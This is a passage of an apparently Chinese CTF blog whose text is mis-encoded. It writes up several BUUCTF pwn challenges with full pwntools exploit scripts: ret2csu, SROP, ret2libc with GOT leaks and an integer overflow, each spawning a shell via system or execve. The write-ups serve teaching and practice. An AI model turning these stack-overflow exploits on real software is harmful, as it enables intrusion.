<p>è€ƒè™‘åˆ°åœ¨<code>vuln()</code>å‡½æ•°ä¸­åªåˆ†é…äº†<code>0x10</code>ä¸ªå­—èŠ‚çš„ç©ºé—´ç»™bufï¼Œä½†æ˜¯åé¢çš„ç³»ç»Ÿè°ƒç”¨<code>write</code>ä¼šè¾“å‡º0x30ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œå³é™¤äº†æˆ‘ä»¬çš„è¾“å…¥ä¹‹å¤–è¿˜ä¼šæ‰“å°ä¸€äº›æ ˆä¸Šçš„å†…å®¹ï¼Œå…¶ä¸­å‰0x20ä¸ªå­—èŠ‚çš„å†…å®¹åˆ†åˆ«ä¸ºï¼š0x10å­—èŠ‚çš„bufã€8å­—èŠ‚çš„old_rbpï¼ˆä½œä¸ºè¿”å›åœ°å€ï¼‰ã€8å­—èŠ‚çš„mainå‡½æ•°ä¸­çš„<code>call vuln</code>æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œå‰©ä¸‹çš„0x10ä¸ªå­—èŠ‚åˆ™æ˜¯æ ˆä¸Šçš„ä¸€äº›å…¶ä»–çš„å†…å®¹</p>
<p>æˆ‘ä»¬ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•çœ‹çœ‹æ˜¯ä»€ä¹ˆå†…å®¹ï¼š</p>
<p><img src="https://i.loli.net/2021/04/18/al52jEGe9s3Y1kV.png" alt="image.png"></p>
<p>å¯ä»¥çœ‹åˆ°<code>0x7ffd56734960</code>ä¸Šå‚¨å­˜çš„å†…å®¹å³ä¸º<code>old_rbp</code>ï¼Œ<code>0x7ffd56734968</code>ä¸Šå‚¨å­˜çš„å†…å®¹ä¸ºmainå‡½æ•°ä¸­çš„<code>call vuln</code>æŒ‡ä»¤çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œè€Œ<code>0x7ffd56734970</code>ä¸Šå‚¨å­˜çš„åˆ™æ˜¯ä¸€ä¸ª<strong>æ ˆä¸Šåœ°å€</strong></p>
<p>æˆ‘ä»¬å¾ˆå®¹æ˜“è®¡ç®—å¾—å‡ºå…¶ä¸ä¸‹ä¸€æ¬¡è¯»å…¥æ—¶ä¸ buf é—´çš„åç§»é‡ä¸º<strong>0x7ffd56734a68 - 0x7ffd56734950 &#x3D; 0x118</strong></p>
<p><img src="https://i.loli.net/2021/04/18/SBb3oUqdig8hCtu.png" alt="image.png"></p>
<p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦è¯»å–è¿™ä¸ªå€¼å†å‡å»åç§»é‡ä¾¿å¯ä»¥<strong>å¾—åˆ°bufçš„åœ°å€</strong></p>
<h3 id="è§£æ³•1ï¼šret2csu"><a href="#è§£æ³•1ï¼šret2csu" class="headerlink" title="è§£æ³•1ï¼šret2csu"></a>è§£æ³•1ï¼šret2csu</h3><p>è€ƒè™‘åˆ°å­˜åœ¨<strong>59å·ç³»ç»Ÿè°ƒç”¨execve</strong>ï¼Œæ•…è€ƒè™‘æ„é€ ropé“¾é€šè¿‡<code>execve(&quot;/bin/sh&quot;,0,0)</code>ä»¥getshell</p>
<p>æ–‡ä»¶ä¸­ä¸å­˜åœ¨<code>&quot;/bin/sh&quot;</code>å­—ç¬¦ä¸²ï¼Œç”±äºæ ˆåŸºå€å¯çŸ¥ï¼Œæ•…è€ƒè™‘æ‰‹åŠ¨è¾“å…¥åˆ°æ ˆä¸Š</p>
<p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨csuä¸­çš„gadgetå…ˆå°†r13ã€r14ç½®ä¸º0ï¼Œä¹‹åå†<code>mov rdx,r13;mov rsi,r14</code>å°†rsiå’Œrdxç½®ä¸º0</p>
<p>ç”±äºè¿™ä¸ªgadgetè¿è¡Œåˆ°åé¢ä¼šæ‰§è¡Œ<code>call [r12 + 8*rbx]</code>ï¼ˆrbxå·²è¢«ç½®0ï¼Œæ•…å®é™…æ•ˆæœæ˜¯æ‰§è¡Œ&#96;&#96;&#96;call [r12]&#96;&#96;ï¼‰ï¼Œæ•…æˆ‘ä»¬è¿˜éœ€è¦åœ¨r12å†…æ”¾å…¥ä¸€ä¸ªå­˜æœ‰é€‚åˆæŒ‡ä»¤çš„åœ°å€çš„åœ°å€ï¼Œè¿™é‡Œç”±äºæ­¤å‰æˆ‘ä»¬å·²ç»è·å¾—äº†ä¸€ä¸ªæ ˆä¸Šåœ°å€ï¼Œæ•…è€ƒè™‘ç›´æ¥åœ¨æ ˆä¸Šæ”¾ä¸€ä¸ªå¸¦æœ‰retçš„gadgetçš„åœ°å€åå°†r12ç½®ä¸ºè¯¥æ ˆä¸Šåœ°å€å³å¯ç»§ç»­æ§åˆ¶ç¨‹åºæ‰§è¡Œæµï¼Œ<strong>éœ€è¦æ³¨æ„çš„æ˜¯callæŒ‡ä»¤ä¼šå¾€æ ˆä¸Šå‹å…¥å½“å‰çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†ä¹‹å¼¹å‡ºæ ˆ</strong></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">mov_rax_59_ret = <span class="number">0x4004e2</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4005a3</span></span><br><span class="line">pop_rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x40059a</span></span><br><span class="line">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12 = <span class="number">0x400580</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28147</span>)<span class="comment">#process(&#x27;./ciscn_s_3&#x27;)# </span></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">8</span>))-<span class="number">0x118</span></span><br><span class="line">sh_addr = stack_addr + <span class="number">8</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(sh_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload2 =  p64(pop_rdi_ret) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)</span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(stack_addr) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload2 += p64(mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12)</span><br><span class="line">payload2 += p64(mov_rax_59_ret) + p64(pop_rdi_ret) + p64(sh_addr)</span><br><span class="line">payload2 += p64(syscall)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬å³å¯getshell</p>
<p><img src="https://i.loli.net/2020/11/28/cCwJmaSEt5Kxqeg.png" alt="image.png"></p>
<h3 id="è§£æ³•2ï¼šSROP"><a href="#è§£æ³•2ï¼šSROP" class="headerlink" title="è§£æ³•2ï¼šSROP"></a>è§£æ³•2ï¼šSROP</h3><blockquote>
<p><del>è¯•äº†å¥½å‡ ç§å§¿åŠ¿éƒ½æ²¡å¼„å‡ºæ¥ï¼Œç¦»è°±</del></p>
<p><del>éš¾é“SROPé€€å‡ºå†å²èˆå°äº†ğŸ</del></p>
<p>æ˜¯æˆ‘å‚»äº†ï¼Œæˆ‘ç»™å¼„æˆstr().encode()äº†ï¼Œåº”è¯¥ç”¨bytes()â€¦</p>
<p><del>æ—©çŸ¥é“è‡ªå·±æ‰‹æ’•ä¸€ä¸ªframeå¯èƒ½è¿˜å¥½ç‚¹</del></p>
</blockquote>
<p>å‰é¢çš„è§£æ³•æˆ‘ä»¬ä½¿ç”¨äº†gadgetä¸­ç»™å‡ºçš„59å·ç³»ç»Ÿè°ƒç”¨<code>execve</code>ï¼Œè¿™ä¸ªè§£æ³•åˆ™æ˜¯ä½¿ç”¨äº†gadgetä¸­ç»™å‡ºçš„å¦å¤–ä¸€ä¸ª15å·ç³»ç»Ÿè°ƒç”¨<code>rt_sigreturn</code></p>
<p>ç³»ç»Ÿè°ƒç”¨<code>rt_sigreturn</code>ç”¨äºæ¢å¤ç”¨æˆ·æ€çš„å¯„å­˜å™¨çŠ¶æ€ï¼Œä»æ ˆä¸Šä¿å­˜çš„æ•°æ®æ¥æ¢å¤å¯„å­˜å™¨çš„çŠ¶æ€</p>
<p>åœ¨æ­£å¸¸æƒ…å†µä¸‹ï¼Œç”±ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€ä¹‹å‰ï¼Œç³»ç»Ÿä¼šå°†å½“å‰è¿›ç¨‹çš„å¯„å­˜å™¨çŠ¶æ€å‹å…¥æ ˆä¸­ï¼Œå°†<code>rt_sigreturn</code>ä½œä¸ºè¿”å›åœ°å€ä¸€å¹¶å‹å…¥ï¼›ä»å†…æ ¸æ€åˆ‡å›ç”¨æˆ·æ€æ—¶ä¾¿é€šè¿‡æ ˆä¸Šçš„æ•°æ®æ¥æ¢å¤å¯„å­˜å™¨çš„çŠ¶æ€ï¼Œå¤§è‡´å¸ƒå±€å¦‚ä¸‹ï¼š</p>
<p><img src="https://image.3001.net/images/20151128/14487175105930.png!small" alt="image.png"></p>
<p>å› æ­¤æˆ‘ä»¬åªéœ€è¦ä¼ªé€ ä¸€ä¸ªSigreturnFrameæ‰§è¡Œexecve(â€œ&#x2F;bin&#x2F;shâ€,0,0)å³å¯</p>
<p>ä½¿ç”¨pwntoolsä¸­çš„SigreturnFrameå·¥å…·å¯ä»¥å¿«é€Ÿæ„é€ ä¸€ä¸ª fake frame</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p =remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26063</span>)<span class="comment"># process(&#x27;./ciscn_s_3&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line">mov_rax_15_ret = <span class="number">0x4004da</span></span><br><span class="line">vuln_addr = <span class="number">0x4004ed</span></span><br><span class="line">syscall_addr = <span class="number">0x400517</span></span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(vuln_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv(<span class="number">0x20</span>)</span><br><span class="line">stack_leak = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x118</span></span><br><span class="line">log.info(<span class="string">&quot;stack addr: &quot;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span> <span class="comment"># syscall::execve, constants.SYS_execve is also ok</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">frame.rdi = stack_leak</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">payload2 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(mov_rax_15_ret) + p64(syscall_addr) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/11/29/CJxnp4FVN6RoujY.png" alt="image.png"></p>
<blockquote>
<p>SROP(Sigreturn Oriented Programming)æŠ€æœ¯åˆ©ç”¨äº†ç±»Unixç³»ç»Ÿä¸­çš„Signalæœºåˆ¶ï¼Œå¦‚å›¾ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190522125217-5fced1dc-7c4d-1.png" alt="img"></a></p>
<ol>
<li>å½“ä¸€ä¸ªç”¨æˆ·å±‚è¿›ç¨‹å‘èµ·signalæ—¶ï¼Œæ§åˆ¶æƒåˆ‡åˆ°å†…æ ¸å±‚</li>
<li>å†…æ ¸ä¿å­˜è¿›ç¨‹çš„ä¸Šä¸‹æ–‡(å¯¹æˆ‘ä»¬æ¥è¯´é‡è¦çš„å°±æ˜¯å¯„å­˜å™¨çŠ¶æ€)åˆ°ç”¨æˆ·çš„æ ˆä¸Šï¼Œç„¶åå†æŠŠrt_sigreturnåœ°å€å‹æ ˆï¼Œè·³åˆ°ç”¨æˆ·å±‚æ‰§è¡ŒSignal Handlerï¼Œå³è°ƒç”¨rt_sigreturn</li>
<li>rt_sigreturnæ‰§è¡Œå®Œï¼Œè·³åˆ°å†…æ ¸å±‚</li>
<li>å†…æ ¸æ¢å¤â‘¡ä¸­ä¿å­˜çš„è¿›ç¨‹ä¸Šä¸‹æ–‡ï¼Œæ§åˆ¶æƒäº¤ç»™ç”¨æˆ·å±‚è¿›ç¨‹</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5240">å…ˆçŸ¥ç¤¾åŒº-SROP exploit</a></p>
</blockquote>
<h2 id="0x016-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop-ret2libc"><a href="#0x016-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop-ret2libc" class="headerlink" title="0x016.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop - ret2libc"></a>0x016.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop - ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œåªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2020/10/19/2FfsUenMSKoQ7qY.png" alt="image.png"></p>
<p>æ‹–å…¥IDAåˆ†æ</p>
<p><img src="https://i.loli.net/2020/10/19/PDEMKizc5g2HIyl.png" alt="image.png"></p>
<p>ç›´æ¥ç»™äº†ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡ºï¼Œä½†æ˜¯æ²¡æœ‰ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘æ„é€ ropé“¾å…ˆæ³„éœ²readå‡½æ•°çœŸå®åœ°å€å†ä½¿ç”¨LibcSearcherå¯»æ‰¾Libcç‰ˆæœ¬æœ€åæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>ä»¥getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher import *</span><br><span class="line">from pwn import *</span><br><span class="line">p = remote(&#x27;node3.buuoj.cn&#x27;,28409)#process(&#x27;./2018_rop&#x27;)</span><br><span class="line">e = ELF(&#x27;./2018_rop&#x27;)</span><br><span class="line">offset = 0x88</span><br><span class="line">read_got = e.got[&#x27;read&#x27;]</span><br><span class="line">write_plt = e.plt[&#x27;write&#x27;]</span><br><span class="line"></span><br><span class="line">payload1 = offset * b&#x27;A&#x27; + p32(0xdeadbeef) + p32(write_plt) + p32(0x8048474) + p32(1) + p32(read_got) + p32(4)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line">read_str = p.recv(4).ljust(4,b&#x27;\x00&#x27;)</span><br><span class="line">print(read_str)</span><br><span class="line">read_addr = u32(read_str)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span><br><span class="line">libc_base = read_addr - libc.dump(&#x27;read&#x27;)</span><br><span class="line">sys_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">sh_addr = libc_base  + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = offset * b&#x27;A&#x27; + p32(0xdeadbeef) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/10/19/5HYQqUcMGavCsdS.png" alt="image.png"></p>
<h2 id="0x017-bjdctf-2020-babyrop-ret2csu-ret2libc"><a href="#0x017-bjdctf-2020-babyrop-ret2csu-ret2libc" class="headerlink" title="0x017.bjdctf_2020_babyrop - ret2csu + ret2libc"></a>0x017.bjdctf_2020_babyrop - ret2csu + ret2libc</h2><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œåªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/11/15/zhfrI8Kpij7NWT6.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/11/15/cmGeARE3V18x9H2.png" alt="image.png"></p>
<p>å¯ä»¥å‘ç°åœ¨<code>vuln()</code>å‡½æ•°å¤„å­˜åœ¨æ ˆæº¢å‡º</p>
<p>ç”±äºæ²¡æœ‰åé¢å‡½æ•°ï¼Œæ•…è€ƒè™‘ret2libcæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28167</span>) <span class="comment"># p = process(&#x27;./bjdctf_2020_babyrop&#x27;) # </span></span><br><span class="line">e = ELF(<span class="string">&#x27;./bjdctf_2020_babyrop&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400733</span></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">offset = <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">payload1 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(e.sym[<span class="string">&#x27;vuln&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">puts_str = p.recvuntil(<span class="string">b&#x27;\nPull up&#x27;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(puts_str)</span><br><span class="line">puts_addr = u64(puts_str)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = offset*<span class="string">b&#x27;A&#x27;</span> + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/11/15/S46DkWpHcz5qLiF.png" alt="image.png"></p>
<h2 id="0x018-pwn2-sctf-2016-integer-overflow-ret2libc"><a href="#0x018-pwn2-sctf-2016-integer-overflow-ret2libc" class="headerlink" title="0x018.pwn2_sctf_2016 - integer overflow + ret2libc"></a>0x018.pwn2_sctf_2016 - integer overflow + ret2libc</h2><p>æƒ¯ä¾‹<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NXä¿æŠ¤</p>
<p>![0QJ_UK7O_A2KJOURYNP&#96;_KW.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png">https://i.loli.net/2020/10/09/j5cJeXs3HS4VQr2.png</a>)</p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨<code>vuln()</code>å‡½æ•°ä¸­ä½¿ç”¨<code>get_n()</code>å‡½æ•°è¯»å…¥4å­—èŠ‚å¹¶ä½¿ç”¨<code>atoi()</code>è½¬ä¸ºæ•°å­—ï¼Œè‹¥æ˜¯å¤§äº32åˆ™é€€å‡ºï¼Œå¦åˆ™å†ä¸€æ¬¡è°ƒç”¨<code>get_n()</code>å‡½æ•°è¿›è¡Œè¯»å…¥</p>
<p>![A&#96;GN6_COM3ZZ5BGCO0P1~AK.png](<a target="_blank" rel="noopener" href="https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png">https://i.loli.net/2020/10/09/IUtdTGcg2eHshOn.png</a>)</p>
<p>ä¸è¿‡æˆ‘ä»¬å¯ä»¥å‘ç°åœ¨<code>get_n()</code>å‡½æ•°ä¸­ï¼Œå…¶æ‰€æ¥æ”¶çš„ç¬¬äºŒä¸ªå‚æ•°ä¸º<code>unsigned int</code>ï¼Œè‹¥æ˜¯æˆ‘ä»¬è¯»å…¥æ•°å­—<code>-1</code>åˆ™ä¼šå‘ç”Ÿæ•´æ•°æº¢å‡ºå˜æˆä¸€ä¸ªå·¨å¤§çš„æ­£æ•°ï¼Œé‚£ä¹ˆåœ¨è¿™é‡Œä¾¿å­˜åœ¨æº¢å‡ºç‚¹äº†</p>
<p><img src="https://i.loli.net/2020/10/09/Iy2iukBamRfXd1x.png" alt="SH@J5_XNE_9R_DEH0R_A_T0.png"></p>
<p>æ–‡ä»¶æœ¬èº«ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„å‡½æ•°ï¼ˆå¹¶ä¸”é™„èµ äº†ä¸€å †æ²¡ç”¨çš„gadgetï¼‰ï¼Œæ•…è€ƒè™‘<strong>ret2libc</strong>ï¼Œé¦–å…ˆæ³„æ¼å‡ºprintfå‡½æ•°åœ°å€ï¼Œå†ä½¿ç”¨LibcSearcherå¾—åˆ°libcï¼Œæœ€åæ„é€ <code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>ç¨‹åºä¸­å­˜åœ¨<code>%s</code>å­—ç¬¦ä¸²ä¾›æ‰“å°</p>
<p><img src="https://i.loli.net/2020/10/09/MzHjLZfqXTpBxaF.png" alt="1__H@0HQW54N_D27DI_SM_3.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x804A040</span></span><br><span class="line">fmtstr_addr = <span class="number">0x8048702</span></span><br><span class="line">printf_got = e.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_plt = e.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = e.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(printf_plt) + p32(main_addr) + p32(fmtstr_addr) + p32(printf_got)</span><br><span class="line"></span><br><span class="line">p =remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29032</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;You said&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>,printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x2c</span> + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) +  <span class="number">5</span>*p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/10/09/3pdunR4j1yBtrOL.png" alt="E@O1G4DY_S2_DR_2J_0E__O.png"></p>
<h2 id="0x019-others-shellcode"><a href="#0x019-others-shellcode" class="headerlink" title="0x019.others_shellcode"></a>0x019.others_shellcode</h2><p>ç›´æ¥è¿æ¥å°±æœ‰flagäº†â€¦</p>
<p><img src="https://i.loli.net/2020/11/15/ci6yp5J3jWVagZK.png" alt="image.png"></p>
<h2 id="0x01A-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc"><a href="#0x01A-HarekazeCTF2019-baby-rop2-ret2csu-ret2libc" class="headerlink" title="0x01A.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc"></a>0x01A.[HarekazeCTF2019]baby_rop2 - ret2csu + ret2libc</h2><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†NX</p>
<p><img src="https://i.loli.net/2020/10/09/dhNruafBqwiGHj7.png" alt="image.png"></p>
